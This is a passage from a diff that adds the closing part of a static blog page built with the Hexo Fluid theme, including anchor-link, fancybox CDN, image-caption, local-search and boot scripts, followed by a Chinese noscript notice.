+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
